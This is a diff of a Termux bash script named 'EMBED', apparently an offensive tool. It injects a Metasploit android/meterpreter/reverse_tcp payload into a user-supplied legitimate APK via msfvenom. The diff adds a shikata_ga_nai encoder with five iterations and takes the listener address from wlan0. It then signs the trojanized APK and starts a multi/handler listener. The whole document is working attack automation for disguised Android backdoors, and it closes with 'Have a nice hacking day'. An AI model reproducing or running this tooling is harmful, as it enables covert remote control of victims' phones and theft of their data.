@@ -3,10 +3,7 @@ set -euo pipefail
 IFS=$'\n\t'
 trap ctrl_c 2
 function ctrl_c () {
-                echo "
-		"
-                printf "$Y [!]$R Going me on https://t.me/Ivam3by_Cinderella$W
-                \n"
+                printf "$Y [!]$R Going me on https://t.me/Ivam3byCinderella$W\n"
         }
 
 # VAR
@@ -19,7 +16,10 @@ function ctrl_c () {
         W='\033[0m'
 	TMP_DIR=$HOME/java
 	unsign=$(find $TMP_DIR/unsign -name "output.apk")
-
+	PAYLOAD=android/meterpreter/reverse_tcp
+	INTER=5
+	ENCODER=x86/shikata_ga_nai
+	LHOST="$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)"
 function Banner {
 	echo $(clear)
 	printf "$Y"
@@ -27,12 +27,10 @@ function Banner {
 	echo "   | ____|  \/  | __ )| ____|  _ \ "
 	echo "   |  _| |TERMUX|  _ \|  _| | | | |"
 	echo "   | |___| |\/| | |_) | |___| |_| |"
-	echo "   |_____|_|  |_|____/|_____|____/ v.1.6"
-	printf "$W
-	\n"
+	echo "   |_____|_|  |_|____/|_____|____/ v.1.6.5"
+	printf "$W\n\n"
 }
-
-function Chao_chao {
+Chao_chao() {
 	echo $(clear)
         echo "
         "
@@ -50,70 +48,51 @@ function Chao_chao {
         "
 }
 
-function SET {
+SET() {
 	Banner
-printf "$C [IbyC]$M Let's to configure it$W
-	\n"
-	sleep 2
-
+printf "$C [IbyC]$M Let's to configure it$W\n\n"
 printf "$C [Set]$G LEGITIM .APK$W"
 	while read -p " >> " APK && [ -z $APK ]; do
-		printf "\n $R
-		[W] O-ops!! Please set some legitim .Apk
-		$W \n"
+		printf "$R\n[W] O-ops!! Please set some legitim .Apk$W\n"
 	done
 			if [ ! -e $APK ]; then
-				printf "$R [W] O-ops!! the .Apk doesn't exist
-				$W \n"
-				sleep 2
+				printf "$R[W] O-ops!! the .Apk doesn't exist$W\n"
+				sleep 1
 				SET
 			fi
-
-printf "$C [Set]$G PAYLOAD$W"
-	while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
-		printf "\n $R
-		[W] O-ops!! Please set a payload
-		$W \n"
-	done
-
-printf "$C [Set]$G LOCAL HOST$W"
-        while read -p " >> " LHOST && [ -z $LHOST ]; do
-                printf "\n $R
-                [W] O-ops!! Please set a host
-                $W \n"
-	done
-
+#printf "$C [Set]$G PAYLOAD$W"
+#	while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
+#		printf "\n$R[W] O-ops!! Please set a payload$W\n"
+#	done
+#printf "$C [Set]$G LOCAL HOST$W"
+#        while read -p " >> " LHOST && [ -z $LHOST ]; do
+#                printf "$R\n[W] O-ops!! Please set a host$W\n"
+#	done
 printf "$C [Set]$G LOCAL PORT$W"
         while read -p " >> " LPORT && [ -z $LPORT ]; do
-                printf "\n $R
-                [W] O-ops!! Please set a local port
-                $W \n"
+                printf "$R\n[W] O-ops!! Please set a local port$W\n"
         done
-
 printf "$C [Set]$G NAMED YOUR .APK$W"
 	while read -p " >> " MYAPK && [ -z $MYAPK ]; do
-		printf "\n $R
-		[W] O-ops!! Please set a name
-		$W \n"
+		printf "$R\n[W] O-ops!! Please set a name$W\n"
 	done
 sleep 1
 	Check
 }
-function Check {
+Check() {
 	Banner
-	printf "$C [IbyC]$M Is the setting correct ?
-	"
+	printf "$C [IbyC]$M Is the setting correct ?\n\n"
 	sleep 1
-printf "$Y [!]$G L-APK   =$W $APK \n"
-printf "$Y	 [!]$G PAYLOAD =$W $PAYLOAD \n"
-printf "$Y	 [!]$G LHOST   =$W $LHOST \n"
-printf "$Y	 [!]$G LPORT   =$W $LPORT \n"
-printf "$Y	 [!]$G YourApk =$W $MYAPK \n"
+printf "$Y	 [!]$G L-APK          =$W $APK \n"
+printf "$Y	 [!]$G PAYLOAD        =$W $PAYLOAD \n"
+printf "$Y	 [!]$G LHOST          =$W $LHOST \n"
+printf "$Y	 [!]$G LPORT          =$W $LPORT \n"
+printf "$Y       [!]$G INTERACTIONS   =$W $INTER \n"
+printf "$Y       [!]$G ENCODER        =$W $ENCODER \n"
+printf "$Y	 [!]$G YOUR APK       =$W $MYAPK \n"
 echo 
 	while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
-		printf "\n $R
-		[W] O-ops!! Please answer the question
-		$W \n"
+		printf "$R\n[W] O-ops!! Please answer the question$W\n\n"
 	done
 		if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
 			Payload
@@ -121,81 +100,62 @@ echo
 			SET
 		fi
 }
-function Payload {
+Payload() {
 	Banner
-	printf "$C [IbyC]$M Creating payload . . .$W
-	"
-	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
-	sleep 2
+	printf "$C [IbyC]$M Creating payload . . .$W\n"
+	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e $ENCODER -i $INTER
         sign
 }
-function sign {
+sign() {
 	Banner
 	printf "$C [IbyC]$M Choose a type of signature
 	\n"
 	printf "$C [1]$G Jarsigner \n"
-	printf "$C [2]$G Apksigner$W
-	\n"
+	printf "$C [2]$G Apksigner$W\n\n"
 	while read -p "(1/2) >> " SIGN && [ -z $SIGN ]; do
-		printf "$R
-		[W] Please, choose an option
-		\n $W"
+		printf "$R\n[W] Please, choose an option\n$W"
 	done
 	
 	if [ $SIGN -eq '1' ]; then
-		echo
-		printf "$C [IbyC]$M Signing the .Apk with signapk tool. . .$W \n"
+		printf "$C\n\n [IbyC]$M Signing the .Apk with signapk tool. . .$W \n"
 		cd $TMP_DIR/openjdk
-                sleep 3
 		signapk publickey.x509.pem publickey.pk8 $TMP_DIR/unsign/output.apk $TMP_DIR/finished/$MYAPK
                 rm $TMP_DIR/unsign/output.apk
 		cd $HOME
-		echo
-		printf "$G \n \t DONE!!
-		$W"
-		sleep 1
+		printf "$G\n\tDONE!!\n$W"
 		Ending
 	elif [ $SIGN -eq '2' ]; then
 		printf "$C [IbyC]$M Signing the .Apk with apksigner tool. . .$W \n"
 		cd $TMP_DIR/unsign
-		sleep 3
 		apksigner -p Ivam3byCinderella keystore output.apk $TMP_DIR/finished/$MYAPK
 		rm output.apk
 		cd $HOME
-		printf "$G \n \t DONE!!
-		$W"
+		printf "$G\n\tDONE!!$W\n"
 		sleep 1
 		Ending
 	else
 			sign
 	fi
 }
-function Set_Handler {
+Set_Handler() {
 	Banner
-	printf "$C \n [Set]$G LOCAL HOST$W"
+	printf "$C\n [Set]$G LOCAL HOST$W"
 		while read -p " >> " LHOST && [ -z $LHOST ]; do
-			printf "\n $R
-			[W] O-ops!! Please set a host
-			$W \n"
+			printf "\n$R[W] O-ops!! Please set a host$W\n"
 		done
 	printf "$C [Set]$G LOCAL PORT$W"
 		while read -p " >> " LPORT && [ -z $LPORT ]; do
-			printf "\n $R
-			[W] O-ops!! Please set a local port
-			$W \n"
+			printf "$R\n[W] O-ops!! Please set a local port$W\n"
 		done
 	Banner
-	printf "$C [IbyC]$M Is the setting correct?
-	"
+	printf "$C [IbyC]$M Is the setting correct?\n\n"
         sleep 1
         printf "$Y [!]$G PAYLOAD =$W $PAYLOAD \n"
 	printf "$Y         [!]$G LHOST   =$W $LHOST \n"
 	printf "$Y         [!]$G LPORT   =$W $LPORT \n"
 	echo
 		while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
-			printf "\n $R
-			[W] O-ops!! Please answer the question
-			$W \n"
+			printf "$R\n[W] O-ops!! Please answer the question$W\n"
 		done
 			if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
 				Msfconsole
@@ -203,10 +163,10 @@ function Set_Handler {
 				Set_Handler
 			fi
 }
-function Msfconsole {
+Msfconsole() {
 	Chao_chao
 	echo
-	printf "$C [IbyC]$M Starting msfconsole . . .$W"
+	printf "$C[IbyC]$M Starting msfconsole . . .$W\n"
 	echo
 	touch $TMP_DIR/handler/$MYAPK.rc
 	echo "use multi/handler" >> $TMP_DIR/handler/$MYAPK.rc
@@ -219,23 +179,16 @@ function Msfconsole {
 	"
 	msfconsole -q -r $TMP_DIR/handler/$MYAPK.rc
 }
-function Ending {
-	printf "$C \n
-[IbyC]$M Do you wanna start msfconsole handler?$W
-	\n"
+Ending() {
+	printf "$C\n[IbyC]$M Do you wanna start msfconsole handler?$W\n"
         while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
-                printf "\n $R
-                [W] Please, choose an option
-                $W \n"
+                printf "$R\n[W] Please, choose an option$W\n"
         done
                 if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                         Banner
-                        printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W
-                        \n"
+                        printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W\n"
                         while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
-                                printf "$R
-                                [W] Please, choose an option
-                                $W \n"
+                                printf "$R\n[W] Please, choose an option$W\n"
                         done
                         if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                                 Msfconsole
@@ -244,13 +197,10 @@ function Ending {
                         fi
                 else
                         Chao_chao
-                        printf "$C [IbyC]$G Thanks to use my EMBED tool$W
-                        \n"
-                        printf "$C [IbyC]$G Have a nice hacking day!!
-                $W \n"
+                        printf "$C[IbyC]$G Thanks to use my EMBED tool$W\n"
+                        printf "$C[IbyC]$G Have a nice hacking day!!\n$W\n"
         fi
 }
-
 echo $(clear)
         printf "$C"
         echo "         -{ IbyC > EMBED } "
